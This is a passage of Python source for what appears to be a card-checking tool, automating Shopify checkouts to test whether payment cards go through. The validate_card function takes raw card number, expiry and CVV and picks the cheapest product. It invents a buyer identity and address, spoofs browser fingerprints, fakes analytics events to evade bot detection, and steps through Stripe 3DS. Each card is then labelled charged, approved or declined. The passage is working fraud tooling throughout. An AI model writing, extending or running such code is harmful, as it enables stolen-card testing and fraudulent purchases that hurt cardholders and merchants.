            "shop_id": shop_id, "total_value": 47, "currency": "USD",
            "event_time": now_ms,
            "event_source_url": checkout_url or base_url,
            "unique_token": client_id,
            "page_id": str(uuid.uuid4()).upper(),
            "deprecated_visit_token": visit_token,
            "session_id": f"sh-{str(uuid.uuid4()).upper()[:23]}",
            "source": "trekkie-storefront-renderer",
            "ccpa_enforced": True, "gdpr_enforced": False,
            "is_persistent_cookie": True, "analytics_allowed": True,
            "marketing_allowed": True, "sale_of_data_allowed": False,
            "preferences_allowed": True, "shopify_emitted": True,
            "asset_version_id": "8aba195e1f0d50eb4ee5422e0104eb204e686edd"
        },
        "metadata": {"event_created_at_ms": now_ms}
    }]
    body = {"events": events, "metadata": {"event_sent_at_ms": now_ms}}
    try:
        await session.post(url, data=orjson.dumps(body), headers=headers, timeout=5)
    except Exception:
        pass


async def _get_delivery_estimates(
    session: AsyncSession,
    base_url: str,
    variant_id: str,
    ua: str,
    client_hints: dict,
) -> None:
    url = f"{base_url}/api/unstable/graphql.json"
    headers = {
        'content-type':       'application/json',
        'origin':             base_url,
        'user-agent':         ua,
        **client_hints
    }
    query = """query DeliveryEstimates($productVariantId:ID!$countryCode:CountryCode$postalCode:String$isPostalCodeOverride:Boolean$sellingPlanIdV2:ID){deliveryEstimates(productVariantId:$productVariantId countryCode:$countryCode postalCode:$postalCode isPostalCodeOverride:$isPostalCodeOverride sellingPlanIdV2:$sellingPlanIdV2){selectedShippingOption{presentmentTemplate{titleFormat}minDeliveryTime maxDeliveryTime minCalendarDaysToDelivery maxCalendarDaysToDelivery expiresAt cost{amount}}deliveryAddress{zip timezone}productHandle variant product freeDeliveryThreshold{amount currencyCode}}}"""
    body = {
        "query": query,
        "schemaHandle": "storefront",
        "versionHandle": "unstable",
        "variables": {"productVariantId": f"gid://shopify/ProductVariant/{variant_id}"}
    }
    try:
        await session.post(url, json=body, headers=headers, timeout=5)
    except Exception:
        pass


async def _handle_3ds_action(
    session: AsyncSession,
    action_url: str,
    receipt_id: str,
    checkout_url: str,
    base_url: str,
    sst: str,
    gql_headers: dict,
    graphql_url: str,
    ua: str,
    client_hints: dict,
    _r: callable,
) -> dict:
    from urllib.parse import urlparse, parse_qs

    sec_ch = client_hints.get('sec-ch-ua', '')

    # ── Step 1: Follow the action URL to reach hooks.stripe.com ──────────
    payment_id = None
    m = re.search(r'payment_id=([^&\s"\'\/]+)', action_url)
    if m:
        payment_id = m.group(1)

    stripe_url = None
    try:
        _nav_hdrs = {
            'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language':           'en-US,en;q=0.5',
            'priority':                  'u=0, i',
            'referer':                   checkout_url,
            'sec-ch-ua':                 sec_ch,
            'sec-ch-ua-mobile':          '?0',
            'sec-ch-ua-platform':        client_hints.get('sec-ch-ua-platform', '"Windows"'),
            'sec-fetch-dest':            'iframe',
            'sec-fetch-mode':            'navigate',
            'sec-fetch-site':            'same-origin',
            'sec-gpc':                   '1',
            'upgrade-insecure-requests': '1',
            'user-agent':                ua,
        }
        r = await session.get(action_url, headers=_nav_hdrs, allow_redirects=True)
        final = str(r.url)
        if 'hooks.stripe.com' in final or 'stripe.com' in final:
            stripe_url = final
        else:
            m2 = re.search(r'https://hooks\.stripe\.com/3d_secure_2/hosted\?[^\'"<\s]+', r.text)
            if m2:
                stripe_url = m2.group(0)
    except Exception:
        pass

    # ── Step 2: Parse Stripe params ──────────────────────────────────────
    stripe_params = {}
    if stripe_url:
        parsed        = urlparse(stripe_url)
        stripe_params = {k: v[0] for k, v in dict(parse_qs(parsed.query)).items()}

    # ── Step 3: Fetch hooks.stripe.com page (cookies/TLS needed) ─────────
    if stripe_url:
        try:
            _stripe_hdrs = {
                'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language':           'en-US,en;q=0.5',
                'cache-control':             'max-age=0',
                'priority':                  'u=0, i',
                'referer':                   stripe_url,
                'sec-ch-ua':                 sec_ch,
                'sec-ch-ua-mobile':          '?0',
                'sec-ch-ua-platform':        client_hints.get('sec-ch-ua-platform', '"Windows"'),
                'sec-fetch-dest':            'iframe',
                'sec-fetch-mode':            'navigate',
                'sec-fetch-site':            'same-origin',
                'sec-fetch-user':            '?1',
                'sec-gpc':                   '1',
                'upgrade-insecure-requests': '1',
                'user-agent':                ua,
            }
            await session.get(stripe_url, headers=_stripe_hdrs, allow_redirects=True)
        except Exception:
            pass

    # ── Step 4: Stripe 3DS2 authenticate call ────────────────────────────
    _key = stripe_params.get('source') or stripe_params.get('payment_intent')
    if _key and stripe_params.get('publishable_key'):
        try:
            browser_fp = orjson.dumps({
                "fingerprintAttempted":  False,
                "fingerprintData":       None,
                "challengeWindowSize":   "03",
                "threeDSCompInd":        "Y",
                "browserJavaEnabled":    False,
                "browserJavascriptEnabled": True,
                "browserLanguage":       "en-US",
                "browserColorDepth":     "32",
                "browserScreenHeight":   "1080",
                "browserScreenWidth":    "1920",
                "browserTZ":             "-345",
                "browserUserAgent":      ua
            }).decode('utf-8')
            data = {
                'source':  _key,
                'browser': browser_fp,
                'one_click_authn_device_support[hosted]':                            'true',
                'one_click_authn_device_support[same_origin_frame]':                 'false',
                'one_click_authn_device_support[spc_eligible]':                      'false',
                'one_click_authn_device_support[webauthn_eligible]':                 'true',
                'one_click_authn_device_support[publickey_credentials_get_allowed]': 'false',
                'frontend_execution': 'eyJmaW5nZXJwcmludE91dGNvbWUiOiJub3Rfc3VwcG9ydGVkIn0=',
                'key': stripe_params['publishable_key']
            }
            if stripe_params.get('stripe_account'):
                data['_stripe_account'] = stripe_params['stripe_account']
            if stripe_params.get('payment_intent') and 'source' not in stripe_params:
                data['source'] = stripe_params['payment_intent']

            _auth_hdrs = {
                'accept':            'application/json',
                'accept-language':   'en-US,en;q=0.5',
                'content-type':      'application/x-www-form-urlencoded',
                'origin':            'https://js.stripe.com',
                'priority':          'u=1, i',
                'referer':           'https://js.stripe.com/',
                'sec-ch-ua':         sec_ch,
                'sec-ch-ua-mobile':  '?0',
                'sec-ch-ua-platform': client_hints.get('sec-ch-ua-platform', '"Windows"'),
                'sec-fetch-dest':    'empty',
                'sec-fetch-mode':    'cors',
                'sec-fetch-site':    'same-site',
                'sec-gpc':           '1',
                'user-agent':        ua,
            }
            await session.post(
                'https://api.stripe.com/v1/3ds2/authenticate',
                data=data, headers=_auth_hdrs
            )
        except Exception:
            pass

    # ── Step 5: Poll /payments_api/redirect/poll with store cookies ───────
    completed = False
    if payment_id and action_url:
        _pa           = urlparse(action_url)
        payments_base = f"{_pa.scheme}://{_pa.netloc}"

        _poll_hdrs = {
            'accept':          '*/*',
            'accept-language': 'en-US,en;q=0.5',
            'priority':        'u=1, i',
            'referer':         f"{payments_base}/redirect/complete",
            'sec-fetch-dest':  'empty',
            'sec-fetch-mode':  'cors',
            'sec-fetch-site':  'same-origin',
            'sec-gpc':         '1',
            'user-agent':      ua,
        }
        for p in range(30):
            try:
                rp = await session.get(
                    f"{payments_base}/redirect/poll",
                    params={'origin': 'checkout_one', 'payment_id': payment_id},
                    headers=_poll_hdrs
                )
                if rp.status_code == 200:
                    try:
                        pd     = orjson.loads(rp.content)
                        redir  = pd.get('redirect_url') or pd.get('redirectUrl') or pd.get('url')
                        status = pd.get('status', '')
                        if redir or status in ('complete', 'completed', 'success'):
                            completed = True
                            break
                    except Exception:
                        if any(x in rp.text.lower() for x in ['complete', 'success', 'redirect']):
                            completed = True
                            break
                elif rp.status_code == 302:
                    completed = True
                    break
            except Exception:
                pass
            await asyncio.sleep(3)

        # ── Step 6: Hit Stripe card redirect/complete on the store ────────
        pi = stripe_params.get('payment_intent', '')
        pi_secret = stripe_params.get('payment_intent_client_secret', '')
        if pi and pi_secret:
            try:
                rand_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20))
                _redir_url = (
                    f"{base_url}/payment_providers/stripe/card/redirect/complete"
                    f"?payment_intent={pi}"
                    f"&payment_intent_client_secret={pi_secret}"
                    f"&session_id=rp{rand_id}"
                    f"&source_type=card"
                )
                _rc_hdrs = {
                    'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language':           'en-US,en;q=0.5',
                    'cache-control':             'max-age=0',
                    'priority':                  'u=0, i',
                    'referer':                   'https://hooks.stripe.com/',
                    'sec-ch-ua':                 sec_ch,
                    'sec-ch-ua-mobile':          '?0',
                    'sec-ch-ua-platform':        client_hints.get('sec-ch-ua-platform', '"Windows"'),
                    'sec-fetch-dest':            'iframe',
                    'sec-fetch-mode':            'navigate',
                    'sec-fetch-site':            'cross-site',
                    'sec-fetch-user':            '?1',
                    'sec-gpc':                   '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent':                ua,
                }
                await session.get(_redir_url, headers=_rc_hdrs, allow_redirects=True)
            except Exception:
                pass

        # ── Step 7: payments_api/redirect/complete ────────────────────────
        if completed:
            try:
                _comp_hdrs = {
                    'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language':           'en-US,en;q=0.5',
                    'cache-control':             'max-age=0',
                    'priority':                  'u=0, i',
                    'referer':                   'https://hooks.stripe.com/',
                    'sec-fetch-dest':            'iframe',
                    'sec-fetch-mode':            'navigate',
                    'sec-fetch-site':            'cross-site',
                    'sec-fetch-user':            '?1',
                    'sec-gpc':                   '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent':                ua,
                }
                await session.get(
                    f"{payments_base}/redirect/complete",
                    headers=_comp_hdrs,
                    allow_redirects=True
                )
            except Exception:
                pass

    # ── Step 8: Brief pause then poll receipt up to 3 times ───────────────
    await asyncio.sleep(2)
    for _receipt_attempt in range(3):
        res = await _poll_for_receipt_internal(
            session=session,
            receipt_id=receipt_id,
            sst=sst,
            gql_headers=gql_headers,
            graphql_url=graphql_url,
            _r=_r,
            is_3ds_retry=True,
            wait_count_3ds=_receipt_attempt * 2,
            checkout_url=checkout_url,
            base_url=base_url,
            ua=ua,
            client_hints=client_hints,
        )
        if res.get("Response") in ("ORDER_PLACED", "CHARGED", "3DS_REQUIRED", "APPROVED", "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD"):
            return res
        await asyncio.sleep(3)

    return _r("3DS_REQUIRED", approved="True")


async def _poll_for_receipt_internal(
    session: AsyncSession,
    receipt_id: str,
    sst: str,
    gql_headers: dict,
    graphql_url: str,
    _r: callable,
    is_3ds_retry: bool = False,
    wait_count_3ds: int = 0,
    checkout_url: str = "",
    base_url: str = "",
    ua: str = "",
    client_hints: dict = {},
) -> dict:
    poll_body = {
        "query":         QUERY_POLL,
        "variables":     {"receiptId": receipt_id, "sessionToken": sst},
        "operationName": "PollForReceipt",
    }
    
    _3ds_wait_count = wait_count_3ds
    # Poll up to 15 times
    last_pt = ""
    for poll_idx in range(15):
        try:
            pr = await session.post(
                graphql_url,
                params={"operationName": "PollForReceipt"},
                headers=gql_headers,
                json=poll_body,
            )
            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
        except Exception as ex:
            log.debug("poll[%d] exception: %s", poll_idx, ex)
            await asyncio.sleep(2.0)
            continue

        pt = pd.get("__typename", "")
        last_pt = pt or last_pt
        if pt == "ProcessedReceipt":
            return _r("ORDER_PLACED", charged="True", approved="True")
        if pt == "ActionRequiredReceipt":
            if is_3ds_retry:
                _3ds_wait_count += 1
                if _3ds_wait_count >= 5:
                    return _r("3DS_REQUIRED", approved="True")
                await asyncio.sleep(5)
                continue
            
            action     = pd.get('action', {})
            action_url = action.get('url','') or action.get('offsiteRedirect','')
            if not action_url and action.get('challengeData'):
                try:
                    cdata      = orjson.loads(action['challengeData'])
                    action_url = cdata.get('acsUrl','') or cdata.get('url','')
                except Exception:
                    action_url = str(action.get('challengeData',''))
            
            receipt_id_3ds = pd.get('id', receipt_id)
            return await _handle_3ds_action(
                session=session,
                action_url=action_url,
                receipt_id=receipt_id_3ds,
                checkout_url=checkout_url,
                base_url=base_url,
                sst=sst,
                gql_headers=gql_headers,
                graphql_url=graphql_url,
                ua=ua,
                client_hints=client_hints,
                _r=_r,
            )
            
        if pt == "FailedReceipt":
            pe      = pd.get("processingError") or {}
            pe_type = pe.get("__typename", "")
            if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                return _r("NO_PRODUCT")
            if pe_type == "OrderCreationFailure":
                return _r("ORDER_CREATION_FAILED", approved="True")
            code = str(pe.get("code") or "").upper()
            msg  = str(pe.get("messageUntranslated") or "").upper()
            raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
            norm = _normalize_response(raw) if raw else "CARD_DECLINED"
            approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
            return _r(norm, approved=approved)

        # ProcessingReceipt / WaitingReceipt / unknown → keep polling
        delay_ms = pd.get("pollDelay")
        try:
            delay = float(delay_ms) / 1000 if delay_ms else 2.5
        except (ValueError, TypeError):
            delay = 2.5
        delay = min(max(delay, 1.0), 4.0)
        await asyncio.sleep(delay)

    # Only mark as approved if we actually completed processing
    # ORDER_PROCESSING is not a valid approval - we don't know the final result
    if last_pt in ("ProcessingReceipt", "WaitingReceipt"):
        return _r("ORDER_PROCESSING", charged="True", approved="True")
    return _r("CARD_DECLINED", approved="False")


# ---------------------------------------------------------------------------
# Product fetching with TTL cache
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
    ua: Optional[str] = None,
    client_hints: Optional[dict] = None,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    """
    Returns (best_product, all_candidates_under_max_price, error_string).
    Results are cached per hostname for CACHE_TTL seconds.
    """
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now      = time.time()

    cached = _product_cache.get(hostname)
    if cached and (now - cached["ts"]) < CACHE_TTL:
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    if not ua:
        ua = random.choice(USER_AGENTS)
    if not client_hints:
        client_hints = _client_hints_for_ua(ua)

    session, owned = _make_session(proxy_str, ua)

    headers = {
        "User-Agent":         ua,
        "Accept":             "application/json, text/plain, */*",
        "Accept-Language":    "en-US,en;q=0.9",
        "Origin":             base_url,
        "Referer":            f"{base_url}/",
        **client_hints,
    }

    try:
        all_variants: list[dict] = []
        urls_to_try = [
            f"{base_url}/products.json?limit=250&sort_by=price-ascending",
            f"{base_url}/products.json?limit=250",
        ]
        for url in urls_to_try:
            try:
                log.debug("Fetching products url: %s", url)
                resp = await session.get(url, headers=headers, allow_redirects=True)
                log.debug("Fetching products url: %s status: %d", url, resp.status_code)
                if resp.status_code == 200:
                    data     = orjson.loads(resp.content)
                    products = data.get("products", [])
                    if products:
                        all_variants = products
                        break
                elif resp.status_code in (429, 430):
                    err = "THROTTLED"
                    return None, [], err
            except Exception as ex:
                log.debug("Fetching products url: %s exception: %s", url, ex)
                continue

        candidates: list[dict] = []
        best: Optional[dict]   = None
        best_price             = float("inf")

        if not all_variants:
            # Fallback for headless Shopify (e.g. Gymshark) where products.json is unavailable
            try:
                import xml.etree.ElementTree as ET
                import re
                sitemap_url = f"{base_url}/sitemap_products_1.xml"
                smap_resp = await session.get(sitemap_url, headers=headers, allow_redirects=True)
                if smap_resp.status_code == 200:
                    root = ET.fromstring(smap_resp.content)
                    urls = []
                    for child in root:
                        if child.tag.endswith('url'):
                            for loc in child:
                                if loc.tag.endswith('loc'):
                                    urls.append(loc.text)

                    if urls:
                        sample_urls = random.sample(urls, min(25, len(urls)))
                        for purl in sample_urls:
                            try:
                                if any(x in purl.lower() for x in ["sample", "foil", "wholesale", "tote", "bag", "gift card", "giftcard"]):
                                    continue
                                p_resp = await session.get(purl, headers=headers, allow_redirects=True)
                                matches = re.finditer(r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)', p_resp.text)
                                for m in matches:
                                    variant_id = m.group(1)
                                    price = float(m.group(2))
                                    if 0 < price <= max_price:
                                        entry = {
                                            "site":       base_url,
                                            "price":      f"{price:.2f}",
                                            "price_f":    price,
                                            "variant_id": str(variant_id),
                                            "title":      "Product",
                                            "handle":     "",
                                        }
                                        candidates.append(entry)
                                        if price < best_price:
                                            best_price = price
                                            best       = entry
                            except Exception:
                                pass
            except Exception:
                pass

            if not candidates:
                err = "No products found"
                return None, [], err
        else:
            for product in all_variants:
                title_lower = product.get("title", "").lower()
                handle_lower = product.get("handle", "").lower()
                forbidden = ["sample", "foil", "wholesale", "tote", "bag", "gift card", "giftcard"]
                if any(f in title_lower or f in handle_lower for f in forbidden):
                    continue
                for variant in product.get("variants", []):
                    try:
                        avail = variant.get("available", True)
                        if avail is False:
                            continue
                        price = float(variant.get("price") or "0")
                    except (ValueError, TypeError):
                        continue
                    if price <= 0 or price > max_price:
                        continue
                    vtitle_lower = variant.get("title", "").lower()
                    if any(f in vtitle_lower for f in forbidden):
                        continue
                    entry = {
                        "site":       base_url,
                        "price":      f"{price:.2f}",
                        "price_f":    price,
                        "variant_id": str(variant["id"]),
                        "title":      product.get("title", "Product"),
                        "handle":     product.get("handle", ""),
                    }
                    candidates.append(entry)
                    if price < best_price:
                        best_price = price
                        best       = entry

        if not best:
            err = f"No products under ${max_price:.2f}"
            return None, [], err

        _product_cache[hostname] = {"product": best, "candidates": candidates, "err": None, "ts": now}
        return best, candidates, None

    except (asyncio.TimeoutError, RequestsError):
        err = "Timeout"
        return None, [], err
    except Exception as ex:
        return None, [], str(ex)
    finally:
        if owned:
            res = session.close()
            if asyncio.iscoroutine(res):
                await res


# ---------------------------------------------------------------------------
# Core checkout validator
# ---------------------------------------------------------------------------
async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
) -> dict:
    """
    Full Shopify checkout flow:
      1. Add to cart
      2. Get checkout page  →  extract session token
      3. Shipping proposal  (GraphQL)
      4. Delivery proposal  (GraphQL)
      5. Tokenize card      (PCI vault)
      6. Submit mutation    (GraphQL)
      7. Poll receipt       (GraphQL, if needed)

    Returns a dict with Response, CC, Price, Gate, Site, Charged, Approved, Time.
    """
    t0       = time.time()
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"

    site_url = site_url.strip()
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    proxy    = _parse_proxy(proxy_str)
    ua           = random.choice(USER_AGENTS)
    client_hints = _client_hints_for_ua(ua)


    def _r(response: str, charged: str = "False", approved: str = "False", detail: str = "") -> dict:
        d = {
            "Response": response,
            "CC":       f"{cc}|{month}|{year}|{cvv}",
            "Price":    price,
            "Gate":     gateway,
            "Site":     ourl,
            "Charged":  charged,
            "Approved": approved,
            "Time":     f"{round(time.time() - t0, 2)}s",
        }
        if detail:
            d["Detail"] = detail[:500]
        return d

    sem = _site_semaphores[hostname]
    session, owned = _make_session(proxy_str, ua)

    async with sem:
        try:
            addr         = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            # ── 0. Fetch product if no variant supplied ──────────────────
            # ALWAYS resolve the variant's base price so we can enforce
            # MAX_PRICE no matter how validate_card was called.
            best, all_candidates, err = await _fetch_products(ourl, proxy_str, ua=ua, client_hints=client_hints)
            if not variant_id:
                if not best:
                    return _r(f"NO_PRODUCT: {err}")
                preferred = [c for c in (all_candidates or []) if not any(w in c["title"].lower() for w in ("sample", "foil", "wholesale"))]
                chosen = random.choice(preferred) if preferred else best
                variant_id = chosen["variant_id"]
                price      = chosen["price"]
            else:
                # A variant_id was passed in by the caller. Verify that this
                # variant actually exists in the under-MAX_PRICE candidate
                # list returned by _fetch_products. If it doesn't, refuse to
                # check out — this prevents callers from bypassing MAX_PRICE
                # by passing an arbitrary variant_id.
                matched = next(
                    (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                    None,
                )
                if not matched:
                    return _r(f"PRICE_OVER_MAX: variant {variant_id} is not under ${MAX_PRICE:.2f}")
                price = matched["price"]

            # Hard guard on the resolved base price.
            try:
                if float(price) > MAX_PRICE:
                    return _r(f"PRICE_OVER_MAX: base price ${price} > ${MAX_PRICE:.2f}")
            except (ValueError, TypeError):
                pass

            base_headers = {
                "User-Agent":         ua,
                "Accept":             "application/json, text/plain, */*",
                "Accept-Language":    "en-US,en;q=0.9",
                "Accept-Encoding":    "gzip, deflate, br",
                "Content-Type":       "application/json",
                "Origin":             ourl,
                "Referer":            f"{ourl}/",
                **client_hints,
            }

            # ── 1. Initialize session via /cart.js & Bot-Bypass Funnel ──
            client_id = str(uuid.uuid4())
            visit_token = str(uuid.uuid4())
            cart_token = ""
            try:
                r = await session.get(f"{ourl}/cart.js", headers=base_headers, timeout=15)
                if r.status_code == 200:
                    cart_data = orjson.loads(r.content)
                    cart_token = cart_data.get('token', '')
            except Exception:
                pass

            c_y = session.cookies.get('_shopify_y') or session.cookies.get('shopify_client_id')
            if c_y:
                client_id = c_y
            c_s = session.cookies.get('_shopify_s')
            if c_s:
                visit_token = c_s

            # Get storefront delivery estimates (GraphQL) - background task
            asyncio.create_task(_get_delivery_estimates(session, ourl, variant_id, ua, client_hints))

            # Add to cart
            cart_added = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1",
                 "application/x-www-form-urlencoded; charset=UTF-8"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ]:
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={
                            **base_headers,
                            "Content-Type": ct,
                            "Accept": "application/json, text/javascript, */*; q=0.01",
                            "x-requested-with": "XMLHttpRequest",
                        },
                    )
                    if r.status_code == 200:
                        cart_added = True
                        try:
                            j = orjson.loads(r.content)
                            cart_token = j.get('cart_token') or cart_token
                        except Exception:
                            pass
                        break
                    else:
                        log.debug("cart add failed status: %s body: %s", r.status_code, r.text[:200])
                except Exception as ex:
                    log.debug("cart add exception: %s", ex)
                    continue

            if not cart_added:
                return _r("CART_FAILED")

            # Send Monorail interaction & add-to-cart events will be sent later with actual shop ID

            # Simulate viewing/refreshing cart - optimized
            try:
                r = await session.get(
                    f"{ourl}/cart.js",
                    headers={**base_headers, "Referer": f"{ourl}/cart"}
                )
                if r.status_code == 200:
                    data = orjson.loads(r.content)
                    cart_token = data.get('token') or cart_token
            except Exception:
                pass

            # Start checkout by submitting cart post request to /cart, fall back to /checkout/ if needed
            checkout_url = None
            page_text = ""
            try:
                c_headers = {
                    **base_headers,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cache-Control": "max-age=0",
                    "Referer": f"{ourl}/cart",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                }
                c_data = f'updates%5B%5D=1&checkout=&cart_token={cart_token or ""}'
                cr = await session.post(
                    f"{ourl}/cart",
                    data=c_data,
                    headers=c_headers,
                    allow_redirects=True,
                )
                if cr.status_code in (200, 302):
                    checkout_url = str(cr.url)
                    page_text = cr.text
            except Exception:
                pass

            if not checkout_url or "/checkouts/" not in checkout_url:
                try:
                    cr = await session.post(
                        f"{ourl}/checkout/",
                        allow_redirects=True,
                        headers={**base_headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                    )
                    checkout_url = str(cr.url)
                    page_text = cr.text
                except (asyncio.TimeoutError, RequestsError):
                    return _r("TIMEOUT")
                except Exception as ex:
                    return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")

            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                return _r("SITE_REQUIRES_LOGIN")

            # Extract attempt token from URL
            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]

            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN")

            # Extract session token
            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                pats = [
                    r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                    r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                    r'sessionToken[\s:=]+["\'"]?(AAEB[A-Za-z0-9_\-]+)',
                    r'\"sessionToken\":\"(AAEB[^\"]+)',
                    r'(AAEB[A-Za-z0-9_\-]{30,})',
                ]
                for pat in pats:
                    m = re.search(pat, page_text)
                    if m:
                        sst = m.group(1)
                        break
            if not sst:
                return _r("NO_SESSION_TOKEN")

            # Extract misc tokens
            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = None
            stable_patterns = [
                r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
            ]
            for pat in stable_patterns:
                m = re.search(pat, page_text)
                if m:
                    stable_id = m.group(1)
                    break
            if not stable_id:
                stable_id = (
                    _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                    _extract(page_text, '"stableId":"', '"') or
                    str(uuid.uuid4())
                )

            # Merchandise GID
            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                str(variant_id)
            )

            # Currency
            for s, e in [
                ('currencyCode&quot;:&quot;', "&quot;"),
                ('"currencyCode":"', '"'),
            ]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            # Extract shopId from checkout page
            shop_id_m = re.search(r'"shopId"\s*:\s*(\d+)', page_text)
            shop_id_val = int(shop_id_m.group(1)) if shop_id_m else 25603230

            # Send Monorail interaction & add-to-cart events in background to prevent timeouts
            asyncio.create_task(_monorail_produce(session, ourl, shop_id_val, visit_token, client_id, ua, client_hints))
            asyncio.create_task(_monorail_produce_batch(session, ourl, checkout_url, shop_id_val, visit_token, client_id, ua, client_hints, "product_added_to_cart", "4.27"))
            asyncio.create_task(_monorail_produce_batch(session, ourl, checkout_url, shop_id_val, visit_token, client_id, ua, client_hints, "product_added_to_cart", "5.6"))

            # Re-select address based on detected currency (initial pick used URL only)
            addr         = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone        = addr["phone"]
            street       = addr["address1"]
            city         = addr["city"]
            state        = addr["zoneCode"]
            s_zip        = addr["postalCode"]

            # Subtotal
            subtotal = (
                _extract(page_text,
                         'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                         "&quot;") or
                _extract(page_text,
                         '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"

            # Build ID & source token
            unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id   = None
            m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)
            if not build_id:
                m_b = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', page_text)
                if not m_b:
                    m_b = re.search(r'/build/([a-f0-9]{40})/', page_text)
                build_id = m_b.group(1) if m_b else '4663384ede457d59be87980de7797171b19f2a1b'

            source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            sig_patterns = [
                r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
                r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
                r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
                r'"signature"\s*:\s*"(eyJ[^"]+)"',
                r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
                r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
            ]
            for pat in sig_patterns:
                m = re.search(pat, unescaped)
                if m:
                    ident_sig = m.group(1)
                    break

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "Accept": "application/json",
                "shopify-checkout-authorization": sst,
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "x-checkout-web-deploy-stage": "production",
                "x-checkout-web-server-handling": "fast",
                "x-checkout-web-server-rendering": "yes",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"] = build_id
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            # ── Build base shipping variables (deep-copyable template) ──
            def _base_vars() -> dict:
                return {
                    "sessionInput":  {"sessionToken": sst},
                    "queueToken":    queue_token or "",
                    "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
